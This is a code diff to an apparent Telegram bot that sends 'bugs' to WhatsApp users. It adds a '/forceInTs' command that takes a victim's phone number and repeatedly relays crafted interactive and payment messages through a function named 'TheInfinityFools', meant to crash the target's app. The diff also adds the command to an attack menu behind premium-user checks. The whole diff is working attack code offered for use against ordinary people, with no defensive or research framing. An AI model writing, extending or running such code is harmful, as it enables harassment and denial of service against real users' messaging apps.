@@ -1,4 +1,4 @@
-///CREDIT BASE BY AMBALABU 
+<///CREDIT BASE BY AMBALABU 
 /// NO HAPUS CREDIT 
 (function() {
   'use strict'
@@ -1170,12 +1170,16 @@ bot.action("xbugs", async (ctx) => {
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
+╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        ───⊱  DELAY TYPE ───═⬡
 ◇ /specterdelay 
 ◇ /delayworek
 ◇ /EquarTerdelay
+
+     ───⊱ FORCECLOSE TYPE ───═⬡
+◇ /forceInTs
+
 ╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-◇ /attack
+◇ /combox
 </pre>
 `;
 
@@ -2182,11 +2186,41 @@ bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ct
   })();
 
 });
+/// CASE BUG FORCECLOSE ///
+bot.command("forceInTs", checkWhatsAppConnection, checkPremium, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /forceInTs 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
+    caption: `
+<blockquote>交 Gxion System Attacks ᝄ</blockquote>  
+─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
+
+"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
+☇ Target: ${q}
+☇ Status: Succes
+☇ Type: Forceclose
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
+    },
+  });
+
+  (async () => {
+    for (let i = 0; i < 40; i++) {
+      console.log(chalk.red(`Send Bug Forceclose Free Spam ${i + 1}/30 To ${q}`));
+      await TheInfinityFools(sock, target);
+      await sleep(1000);
+    }
+  })();
+});
 /// CASE BUG 10///
-bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("combox", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message?.text?.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /Xtest 62xx");
+    if (!q) return ctx.reply("🪧 ☇ Example : /combox 62xx");
 
     const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
@@ -2194,7 +2228,7 @@ bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 `<pre>
 ⬡═―━⊱ [ GXION ] ⊰━—═⬡
 ⌑ Target : ${q}
-⌑ Type   : Xtest
+⌑ Type   : COMBO
 ⌑ Status : Successful
 ╘═—━━━━━━━━━━━—═⬡</pre>`,
       {
@@ -2376,6 +2410,54 @@ async function ArTDeadass(sock, target) {
 
     await new Promise(res => setTimeout(res, delay));
   }
+}
+
+async function TheInfinityFools(sock, target) {
+  console.log("Success Send Bug Forclose Vnx");
+  
+  let msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "Vnx - Forclose",
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "send_location",
+                buttonParamsJson: JSON.stringify({
+                  name: "Forclose - Vnx",
+                  address: ""
+                })
+              }
+            ]
+          },
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 3
+          }
+        }
+      }
+    }
+  };
+  
+  await sock.relayMessage(target, msg, {
+    participant: { jid: target },
+    userJid: target,
+    messageId: null
+  });
+  
+  let msg1 = {
+    sendPaymentMessage: {}
+  };
+  
+  await sock.relayMessage(target, msg1, {
+    participant: { jid: target },
+    quoted: null,
+    userJid: target,
+    messageId: null
+  });
 }
 
 // --- Jalankan Bot --- //
